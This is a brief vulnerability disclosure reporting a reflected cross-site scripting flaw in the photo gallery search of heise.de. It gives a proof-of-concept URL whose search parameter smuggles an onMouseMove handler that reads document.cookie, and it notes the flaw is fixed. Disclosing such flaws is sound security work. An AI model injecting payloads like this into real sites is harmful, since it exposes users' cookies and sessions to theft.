==========================
Vulnerability Description
==========================

http://www.heise.de is prone to a XSS vulnerability

==========================
PoC-Exploit
==========================

http://www.heise.de/foto/galerie/suche/photo/?suchwort="
onMouseMove=alert(document.cookie) '

==========================
Solution
==========================

fixed

